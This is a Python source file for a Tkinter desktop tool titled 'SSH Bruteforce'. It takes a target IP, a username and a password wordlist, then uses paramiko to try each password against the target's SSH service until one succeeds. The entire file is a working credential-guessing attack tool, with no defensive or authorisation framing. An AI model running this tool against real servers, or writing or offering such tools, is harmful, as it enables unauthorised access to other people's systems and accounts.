import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.scrolledtext import ScrolledText
import paramiko
import os

# Function to establish SSH connection
def ssh_connect(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        ssh.close()
        return False

class SSHBruteforceApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("SSH Bruteforce")
        self.geometry("800x600")
        self.configure(bg="green")  # Définition de la couleur de fond

        self.create_widgets()

    def create_widgets(self):
        self.label_target = tk.Label(self, text="Target IP Address:", bg="green", fg="white")
        self.label_target.pack(pady=5)
        
        self.entry_target = tk.Entry(self, width=30)
        self.entry_target.pack()

        self.label_username = tk.Label(self, text="Username:", bg="green", fg="white")
        self.label_username.pack(pady=5)
        
        self.entry_username = tk.Entry(self, width=30)
        self.entry_username.pack()

        self.select_password_button = tk.Button(self, text="Select Password File", command=self.select_password_file)
        self.select_password_button.pack(pady=5)

        self.scan_button = tk.Button(self, text="Scan", command=self.scan_ssh)
        self.scan_button.pack(pady=10)

        self.result_text = ScrolledText(self, wrap=tk.WORD, width=80, height=20)
        self.result_text.pack(padx=10, pady=10)

    def select_password_file(self):
        file_path = filedialog.askopenfilename(title="Select password file", filetypes=[("Text files", "*.txt")])
        self.password_file = file_path

    def scan_ssh(self):
        target = self.entry_target.get()
        username = self.entry_username.get()
        
        if not target or not username or not self.password_file:
            messagebox.showwarning("Warning", "Please enter target IP address, username, and select password file.")
            return
        
        if not os.path.isfile(self.password_file):
            messagebox.showwarning("Warning", "Password file does not exist!")
            return
        
        self.result_text.delete("1.0", tk.END)
        
        with open(self.password_file, 'r') as file:
            for line in file:
                password = line.strip()

                try:
                    if ssh_connect(target, username, password):
                        self.result_text.insert(tk.END, f"Password found: {password}\n")
                        return
                    else:
                        self.result_text.insert(tk.END, f"Incorrect password: {password}\n")
                except Exception as e:
                    self.result_text.insert(tk.END, f"Error: {e}\n")

        self.result_text.insert(tk.END, "Password not found in the provided file.\n")

if __name__ == '__main__':
    app = SSHBruteforceApp()
    app.mainloop()
